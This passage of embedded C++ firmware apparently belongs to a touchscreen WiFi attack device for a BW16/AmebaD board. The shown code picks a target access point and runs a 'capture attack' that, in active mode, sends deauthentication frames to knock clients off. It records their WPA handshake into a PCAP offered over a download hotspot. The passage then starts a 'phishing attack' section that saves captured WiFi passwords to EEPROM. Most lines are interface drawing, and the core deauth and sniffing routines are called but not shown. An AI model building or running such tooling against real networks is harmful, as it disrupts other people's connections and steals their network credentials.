  int btnW = 180, btnH = 40, btnX = (SCREEN_WIDTH - btnW) / 2;

  while (true) {
    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      // OK按钮区域 (底部)
      if (ty >= 260 && ty <= 300 && tx >= btnX && tx <= btnX + btnW) {
        { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
        g_touchValid = false;
        return mode;
      }
      // 三个模式按钮
      for (int i = 0; i < 3; i++) {
        int by = 100 + i * 52;
        if (ty >= by && ty <= by + btnH && tx >= btnX && tx <= btnX + btnW) {
          mode = i;
          { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
          g_touchValid = false;
        }
      }
    }

    if (mode == prevMode) { delay(30); continue; }

    if (prevMode == -1) {
      // === 首次绘制：全量 ===
      tft.fillScreen(COLOR_BG);

      // 标题
      tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x4010);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
      u8g2_for_adafruit_gfx.setBackgroundColor(0x4010);
      int tw = u8g2_for_adafruit_gfx.getUTF8Width("选择抓包模式");
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
      u8g2_for_adafruit_gfx.print("选择抓包模式");

      // 目标信息
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
      u8g2_for_adafruit_gfx.setCursor(10, 55);
      u8g2_for_adafruit_gfx.print("目标: ");
      String ssidDisp = _selectedNetwork.ssid.length() > 14 ? utf8SafeTruncate(_selectedNetwork.ssid, 14) + "..." : _selectedNetwork.ssid;
      u8g2_for_adafruit_gfx.print(ssidDisp);

      u8g2_for_adafruit_gfx.setCursor(10, 72);
      u8g2_for_adafruit_gfx.print("信道: ");
      u8g2_for_adafruit_gfx.print(_selectedNetwork.ch);

      // 三个模式按钮
      for (int i = 0; i < 3; i++) drawCaptureModeBtn(i, (mode == i));

      // 确认按钮
      int okY = 260, okH = 40;
      tft.fillRoundRect(btnX, okY, btnW, okH, 6, COLOR_CONFIRM_BG);
      tft.drawRoundRect(btnX, okY, btnW, okH, 6, COLOR_WHITE);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
      tw = u8g2_for_adafruit_gfx.getUTF8Width("开始抓包");
      u8g2_for_adafruit_gfx.setCursor(btnX + (btnW - tw) / 2, okY + 26);
      u8g2_for_adafruit_gfx.print("开始抓包");
    } else {
      // === 增量：仅重绘新旧两个按钮 ===
      drawCaptureModeBtn(prevMode, false);
      drawCaptureModeBtn(mode, true);
    }

    prevMode = mode;
    delay(30);
  }
}

// 抓包进度 — 静态标签/分隔线（只绘制一次）
static void drawCaptureStatic() {
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x03E0);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x03E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("抓包攻击");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("抓包攻击");

  // 信道标签
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(SCREEN_WIDTH - 60, 26);
  u8g2_for_adafruit_gfx.print("CH");
  u8g2_for_adafruit_gfx.print(_selectedNetwork.ch);

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  // 目标SSID
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(5, 50);
  u8g2_for_adafruit_gfx.print("目标: ");
  String ssidDisp = _selectedNetwork.ssid.length() > 12 ? utf8SafeTruncate(_selectedNetwork.ssid, 12) + "..." : _selectedNetwork.ssid;
  u8g2_for_adafruit_gfx.print(ssidDisp);

  // MAC
  u8g2_for_adafruit_gfx.setCursor(5, 65);
  char macStr[26];
  snprintf(macStr, sizeof(macStr), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           _selectedNetwork.bssid[0], _selectedNetwork.bssid[1], _selectedNetwork.bssid[2],
           _selectedNetwork.bssid[3], _selectedNetwork.bssid[4], _selectedNetwork.bssid[5]);
  u8g2_for_adafruit_gfx.print(macStr);

  // 分隔线
  tft.drawLine(0, 82, SCREEN_WIDTH, 82, 0x18E7);

  // ---- 静态标签 ----
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  // 状态机
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(5, 98);
  u8g2_for_adafruit_gfx.print("状态机: ");

  // 握手帧
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.setCursor(5, 114);
  u8g2_for_adafruit_gfx.print("握手帧: ");

  // 管理帧
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(120, 114);
  u8g2_for_adafruit_gfx.print("管理帧: ");

  // PCAP
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(5, 130);
  u8g2_for_adafruit_gfx.print("PCAP: ");

  // 运行
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(5, 146);
  u8g2_for_adafruit_gfx.print("运行: ");

  // 进度条边框
  tft.drawRect(10, 162, SCREEN_WIDTH - 20, 12, 0x8410);

  // Deauth发送
  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.setCursor(5, 186);
  u8g2_for_adafruit_gfx.print("Deauth发送: ");

  // 尝试轮次
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(5, 200);
  u8g2_for_adafruit_gfx.print("尝试轮次: ");
}

// 抓包进度 — 首次全量绘制（含停止按钮）
static void drawCaptureProgressFull(unsigned long elapsedSec) {
  tft.fillScreen(COLOR_BG);
  drawCaptureStatic();
  redrawCaptureDynamic(elapsedSec);
  drawCaptureStopBtn();
}

// 停止抓包按钮（静态，只绘制一次）
static void drawCaptureStopBtn() {
  int sby = 230, sbh = 40;
  tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_BTN_BACK);
  tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("停止抓包");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, sby + 26);
  u8g2_for_adafruit_gfx.print("停止抓包");
}

// 仅刷新动态数值（不重绘标签/分隔线/停止按钮）
static void redrawCaptureDynamic(unsigned long elapsedSec) {
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  // ---- 状态机值 ----
  tft.fillRect(60, 86, 100, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(60, 98);
  const char* stateNames[] = {"空闲", "初始化", "预Deauth", "Deauth阶段", "嗅探阶段", "高效突发", "管理帧捕获", "完成"};
  int st = (int)g_captureState;
  if (st >= 0 && st <= 7) u8g2_for_adafruit_gfx.print(stateNames[st]);
  else u8g2_for_adafruit_gfx.print("未知");

  // ---- 握手帧数值 ----
  tft.fillRect(60, 102, 50, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.setCursor(60, 114);
  u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
  u8g2_for_adafruit_gfx.print("/4");

  // ---- 管理帧数值 ----
  tft.fillRect(175, 102, SCREEN_WIDTH - 175, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(175, 114);
  u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);

  // ---- PCAP大小 ----
  tft.fillRect(48, 118, 150, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(48, 130);
  u8g2_for_adafruit_gfx.print(pcapData.size());
  u8g2_for_adafruit_gfx.print(" bytes");

  // ---- 运行时间 ----
  tft.fillRect(48, 134, 80, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(48, 146);
  u8g2_for_adafruit_gfx.print(elapsedSec);
  u8g2_for_adafruit_gfx.print("s");

  // ---- 进度条填充 ----
  tft.fillRect(11, 163, SCREEN_WIDTH - 22, 10, COLOR_BG);
  int barW = (int)((SCREEN_WIDTH - 22) * elapsedSec / 60);
  if (barW > SCREEN_WIDTH - 22) barW = SCREEN_WIDTH - 22;
  if (barW > 0) tft.fillRect(11, 163, barW, 10, elapsedSec > 45 ? 0xFC00 : 0x07E0);

  // ---- Deauth发送数值 ----
  tft.fillRect(85, 174, SCREEN_WIDTH - 85, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.setCursor(85, 186);
  u8g2_for_adafruit_gfx.print(g_deauthPacketCount + g_preDeauthPacketCount);

  // ---- 尝试轮次数值 ----
  tft.fillRect(78, 188, SCREEN_WIDTH - 78, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(78, 200);
  u8g2_for_adafruit_gfx.print(g_captureAttempts);
}

// 抓包完成 TFT 界面
static void drawCaptureComplete(unsigned long totalMs) {
  tft.fillScreen(COLOR_BG);

  // 标题
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x07E0);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("抓包完成");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("抓包完成");

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  // 统计信息
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(10, 55);
  u8g2_for_adafruit_gfx.print("目标: ");
  u8g2_for_adafruit_gfx.print(_selectedNetwork.ssid);

  u8g2_for_adafruit_gfx.setCursor(10, 72);
  u8g2_for_adafruit_gfx.print("信道: ");
  u8g2_for_adafruit_gfx.print(_selectedNetwork.ch);

  u8g2_for_adafruit_gfx.setCursor(10, 92);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.print("握手帧: ");
  u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
  u8g2_for_adafruit_gfx.print("/4");

  u8g2_for_adafruit_gfx.setCursor(140, 92);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.print("管理帧: ");
  u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);

  u8g2_for_adafruit_gfx.setCursor(10, 110);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.print("PCAP大小: ");
  u8g2_for_adafruit_gfx.print(pcapData.size());
  u8g2_for_adafruit_gfx.print(" bytes");

  unsigned long sec = totalMs / 1000;
  u8g2_for_adafruit_gfx.setCursor(10, 128);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.print("用时: ");
  u8g2_for_adafruit_gfx.print(sec);
  u8g2_for_adafruit_gfx.print("s");

  // EAPOL帧详情
  if (capturedHandshake.frameCount > 0) {
    tft.drawLine(10, 148, SCREEN_WIDTH - 10, 148, 0x18E7);
    u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
    u8g2_for_adafruit_gfx.setCursor(10, 162);
    u8g2_for_adafruit_gfx.print("EAPOL 帧: M1/M2/M3/M4");

    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      const char* mLabel = "?";
      if (capturedHandshake.frames[i].messageType == 1) mLabel = "M1";
      else if (capturedHandshake.frames[i].messageType == 2) mLabel = "M2";
      else if (capturedHandshake.frames[i].messageType == 3) mLabel = "M3";
      else if (capturedHandshake.frames[i].messageType == 4) mLabel = "M4";

      uint16_t mCol = 0x07FF;
      if (capturedHandshake.frames[i].messageType == 1) mCol = 0xF800;
      else if (capturedHandshake.frames[i].messageType == 3) mCol = 0xF800;
      else if (capturedHandshake.frames[i].messageType == 2) mCol = 0x07E0;
      else if (capturedHandshake.frames[i].messageType == 4) mCol = 0x07E0;

      u8g2_for_adafruit_gfx.setForegroundColor(mCol);
      u8g2_for_adafruit_gfx.setCursor(10 + i * 55, 178);
      u8g2_for_adafruit_gfx.print(mLabel);
      u8g2_for_adafruit_gfx.print(":");
      u8g2_for_adafruit_gfx.print(capturedHandshake.frames[i].length);
      u8g2_for_adafruit_gfx.print("B");
    }
  }

  // 返回按钮
  int rby = 250, rbh = 45;
  tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
  tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("返回主菜单");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
  u8g2_for_adafruit_gfx.print("返回主菜单");
}

// 抓包超时 TFT 界面
static void drawCaptureTimeout(unsigned long totalMs) {
  tft.fillScreen(COLOR_BG);

  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0xF800);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0xF800);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("抓包超时");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("抓包超时");

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(10, 55);
  u8g2_for_adafruit_gfx.print("目标: ");
  u8g2_for_adafruit_gfx.print(_selectedNetwork.ssid);

  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(10, 75);
  u8g2_for_adafruit_gfx.print("运行 ");
  u8g2_for_adafruit_gfx.print(totalMs / 1000);
  u8g2_for_adafruit_gfx.print("s 未捕获到完整握手包");

  u8g2_for_adafruit_gfx.setCursor(10, 95);
  u8g2_for_adafruit_gfx.print("握手帧: ");
  u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
  u8g2_for_adafruit_gfx.print("/4");

  u8g2_for_adafruit_gfx.setCursor(10, 115);
  u8g2_for_adafruit_gfx.print("管理帧: ");
  u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);

  if (!pcapData.empty()) {
    u8g2_for_adafruit_gfx.setCursor(10, 135);
    u8g2_for_adafruit_gfx.print("PCAP: ");
    u8g2_for_adafruit_gfx.print(pcapData.size());
    u8g2_for_adafruit_gfx.print(" bytes (部分数据)");
  }

  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(20, 170);
  u8g2_for_adafruit_gfx.print("建议: 确保目标AP附近有活跃客户端");

  u8g2_for_adafruit_gfx.setCursor(20, 190);
  u8g2_for_adafruit_gfx.print("或尝试 \"高效模式\" 重新抓包");

  // 返回按钮
  int rby = 250, rbh = 45;
  tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
  tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("返回主菜单");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
  u8g2_for_adafruit_gfx.print("返回主菜单");
}

// 抓包攻击 — 主入口 (非阻塞状态机 + TFT UI)
void captureHandshake() {
  // 1. 检查已选目标
  int targetIdx = -1;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) { targetIdx = (int)i; break; }
  }
  if (targetIdx < 0) {
    Serial.println("[Capture] 没有选中的目标, 请先在WiFi列表中勾选!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先在WiFi列表中勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先在WiFi列表中勾选目标AP!");

    int rby = 250, rbh = 45;
    tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
    tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("返回主菜单");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
    u8g2_for_adafruit_gfx.print("返回主菜单");

    while (true) {
        int16_t tx, ty;
      if (touch_read(&tx, &ty) && ty >= rby && ty <= rby + rbh && tx >= 40 && tx <= SCREEN_WIDTH - 40) {
        { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
        break;
      }
      delay(30);
    }
    g_touchValid = false;
    g_screen = SCREEN_MAIN;
    currentSelection = 1;
    g_pendingMenuDraw = true;
    return;
  }

  // 2. 填充目标信息
  const WiFiScanResult& target = scan_results[targetIdx];
  memcpy(_selectedNetwork.bssid, target.bssid, 6);
  _selectedNetwork.ssid = target.ssid;
  _selectedNetwork.ch = target.channel;
  AP_Channel = String(target.channel);

  Serial.print("[Capture] 目标: ");
  Serial.print(_selectedNetwork.ssid);
  Serial.print(" CH");
  Serial.println(_selectedNetwork.ch);

  // 3. 模式选择
  int captureMode = drawCaptureModeSelection();

  const char* modeName = (captureMode == 1) ? "被动" : (captureMode == 2 ? "高效" : "主动");
  Serial.print("[Capture] 模式: ");
  Serial.println(modeName);

  // 4. 配置抓包模式
  if (captureMode == 1) {
    g_captureMode = CAPTURE_MODE_PASSIVE;
    g_captureDeauthEnabled = false;
  } else if (captureMode == 2) {
    g_captureMode = CAPTURE_MODE_EFFICIENT;
    g_captureDeauthEnabled = false;
  } else {
    g_captureMode = CAPTURE_MODE_ACTIVE;
    g_captureDeauthEnabled = true;
  }

  // 5. 重置状态
  isHandshakeCaptured = false;
  handshakeDataAvailable = false;
  resetCaptureData();
  resetGlobalHandshakeData();

  // 6. 设置攻击运行状态
  g_attackStop = false;
  g_attackRunningType = 7;
  g_screen = SCREEN_ATTACK_RUNNING;

  // 7. 显示初始化
  tft.fillScreen(COLOR_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("正在初始化抓包...");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
  u8g2_for_adafruit_gfx.print("正在初始化抓包...");

  // 8. 启动非阻塞抓包状态机
  deauthAndSniff();

  // 9. 主循环
  unsigned long startMs = millis();
  unsigned long lastDrawMs = 0;
  const unsigned long timeoutMs = 60000;

  drawCaptureProgressFull(0);

  while (true) {
    // 检查停止按钮（循环首尾各一次，缩短触摸→停止延迟）
    if (!g_attackStop) {
      int16_t tx, ty;
      if (touch_read(&tx, &ty)) {
        if (ty >= 230 && ty <= 270 &&
            tx >= 40 && tx <= SCREEN_WIDTH - 40) {
          g_attackStop = true;
          Serial.println("[停止] 用户触发了停止抓包按钮!");
        }
      }
    }
    if (g_attackStop) break;
    deauthAndSniff_update();

    // 再检查一次停止（用户可能在 deauthAndSniff_update 执行期间触摸了屏幕）
    if (!g_attackStop) {
      int16_t tx, ty;
      if (touch_read(&tx, &ty)) {
        if (ty >= 230 && ty <= 270 &&
            tx >= 40 && tx <= SCREEN_WIDTH - 40) {
          g_attackStop = true;
          Serial.println("[停止] 用户触发了停止抓包按钮!");
        }
      }
    }
    if (g_attackStop) break;

    // 检查是否捕获成功
    if (isHandshakeCaptured && handshakeDataAvailable) {
      Serial.println("[Capture] 握手包捕获成功!");
      break;
    }

    // 检查超时
    if (millis() - startMs > timeoutMs) {
      Serial.println("[Capture] 超时");
      break;
    }

    // UI刷新 500ms间隔
    if (millis() - lastDrawMs >= 500) {
      lastDrawMs = millis();
      redrawCaptureDynamic((millis() - startMs) / 1000);
    }

    delay(30);  // 更短的延迟提高触摸响应
  }

  bool wasStopped = g_attackStop;
  unsigned long elapsedMs = millis() - startMs;

  // 10. 停止抓包 — 先更新UI反馈，再执行清理操作
  if (wasStopped) {
    // 将按钮变为"正在停止..."，让用户知道已收到停止请求
    int sby = 230, sbh = 40;
    tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, 0xE734);  // 红色背景
    tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(0xE734);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("正在停止...");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, sby + 26);
    u8g2_for_adafruit_gfx.print("正在停止...");
    delay(30);  // 确保 SPI 渲染完成，避免 wifi_set_promisc 阻塞时画面未更新
  }
  wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
  delay(20);
  sniffer_active = false;
  readyToSniff = false;
  hs_sniffer_running = false;

  Serial.println("[Capture] 抓包已停止");

  // 11. 生成PCAP（如果需要）
  if (capturedHandshake.frameCount > 0 && pcapData.empty()) {
    generatePcapBuffer();
  }

  // 12. 显示结果界面
  if (isHandshakeCaptured && handshakeDataAvailable) {
    globalPcapData = pcapData;
    lastCaptureTimestamp = millis();
    lastCaptureHSCount = capturedHandshake.frameCount;
    lastCaptureMgmtCount = capturedManagement.frameCount;

    Serial.println("=== 抓包成功 ===");
    Serial.print("握手帧: "); Serial.println(capturedHandshake.frameCount);
    Serial.print("管理帧: "); Serial.println(capturedManagement.frameCount);
    Serial.print("PCAP: "); Serial.print(pcapData.size()); Serial.println(" bytes");
    Serial.print("用时: "); Serial.print(elapsedMs / 1000); Serial.println("s");

    // 启动下载热点 (BW16-WebTest)，界面由 startDownloadAp() 负责绘制
    g_touchValid = false;
    startDownloadAp();
    return;  // startDownloadAp 内部已设置 SCREEN_DOWNLOAD_AP，不再走触摸返回逻辑
  } else if (wasStopped) {
    Serial.println("[Capture] 用户手动停止");
    redrawCaptureDynamic(elapsedMs / 1000);
  } else {
    Serial.println("[Capture] 超时");
    if (!pcapData.empty()) globalPcapData = pcapData;
    drawCaptureTimeout(elapsedMs);
  }

  // 13. 等待触摸返回（仅超时/手动停止走这里，成功分支已 return）
  int rby = 250, rbh = 45;
  Serial.println("触摸返回按钮退出...");
  unsigned long exitStart = millis();
  while (millis() - exitStart < 60000) {
    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      if (tx >= 40 && tx <= SCREEN_WIDTH - 40 && ty >= rby && ty <= rby + rbh) {
        break;
      }
      { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
    }
    delay(30);
  }

  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 钓鱼攻击 ====================

// EEPROM 密码存储 (AmebaD compatible - byte level)
static void phishLoadPasswords() {
  int32_t magic = 0;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    mp[i] = EEPROM.read(PHISH_EEPROM_ADDR + i);

  if (magic == PHISH_EEPROM_MAGIC) {
    uint8_t* cp = (uint8_t*)&phishPasswordCount;
    for (size_t i = 0; i < sizeof(int32_t); i++)
      cp[i] = EEPROM.read(PHISH_EEPROM_ADDR + sizeof(int32_t) + i);

    if (phishPasswordCount < 0 || phishPasswordCount > PHISH_MAX_PASSWORDS)
      phishPasswordCount = 0;
    for (int i = 0; i < phishPasswordCount; i++) {
      uint8_t* pp = (uint8_t*)&phishPasswords[i];
      int32_t off = PHISH_EEPROM_ADDR + (int32_t)sizeof(int32_t) * 2 + i * (int32_t)sizeof(PhishPassword);
      for (size_t j = 0; j < sizeof(PhishPassword); j++)
        pp[j] = EEPROM.read(off + j);
    }
    Serial.print("[Phish] 已加载 ");
    Serial.print(phishPasswordCount);
    Serial.println(" 条密码");
  } else {
    phishPasswordCount = 0;
    Serial.println("[Phish] EEPROM 无密码记录");
  }
}

static void phishSavePasswords() {
  int32_t magic = PHISH_EEPROM_MAGIC;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(PHISH_EEPROM_ADDR + i, mp[i]);

  uint8_t* cp = (uint8_t*)&phishPasswordCount;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(PHISH_EEPROM_ADDR + sizeof(int32_t) + i, cp[i]);

  for (int i = 0; i < phishPasswordCount; i++) {
    uint8_t* pp = (uint8_t*)&phishPasswords[i];
    int32_t off = PHISH_EEPROM_ADDR + (int32_t)sizeof(int32_t) * 2 + i * (int32_t)sizeof(PhishPassword);
    for (size_t j = 0; j < sizeof(PhishPassword); j++)
      EEPROM.write(off + j, pp[j]);
  }

  // ★ 持久化到闪存（ESP32/AmebaD 必须显式 commit）
  EEPROM.commit();
}

// ==================== 亮度存储 (EEPROM) ====================
static void brightnessLoad() {
  int32_t magic = 0;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    mp[i] = EEPROM.read(BRIGHTNESS_EEPROM_ADDR + i);

  if (magic == BRIGHTNESS_EEPROM_MAGIC) {
    int32_t val = 0;
    uint8_t* vp = (uint8_t*)&val;
    for (size_t i = 0; i < sizeof(int32_t); i++)
      vp[i] = EEPROM.read(BRIGHTNESS_EEPROM_ADDR + sizeof(int32_t) + i);
    if (val >= 10 && val <= 100) {
      g_brightness = val;
    }
  }
}

static void brightnessSave() {
  int32_t magic = BRIGHTNESS_EEPROM_MAGIC;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(BRIGHTNESS_EEPROM_ADDR + i, mp[i]);

  int32_t val = g_brightness;
  uint8_t* vp = (uint8_t*)&val;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(BRIGHTNESS_EEPROM_ADDR + sizeof(int32_t) + i, vp[i]);

  EEPROM.commit();  // ★ 持久化到Flash
}

static void brightnessApply() {
  int pwm = map(g_brightness, 0, 100, 0, 255);
  analogWrite(TFT_LED, pwm);
}

// ==================== 自动熄屏存储 (EEPROM) ====================
static void autoSleepLoad() {
  int32_t magic = 0;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    mp[i] = EEPROM.read(AUTO_SLEEP_EEPROM_ADDR + i);

  if (magic == AUTO_SLEEP_EEPROM_MAGIC) {
    int32_t val = 0;
    uint8_t* vp = (uint8_t*)&val;
    for (size_t i = 0; i < sizeof(int32_t); i++)
      vp[i] = EEPROM.read(AUTO_SLEEP_EEPROM_ADDR + sizeof(int32_t) + i);
    // 在选项列表中查找匹配索引
    for (int j = 0; j < AUTOSLEEP_OPT_COUNT; j++) {
      if (autosleepOpts[j] == val) {
        g_autoSleepSec = val;
        g_autoSleepOptIdx = j;
        break;
      }
    }
  }
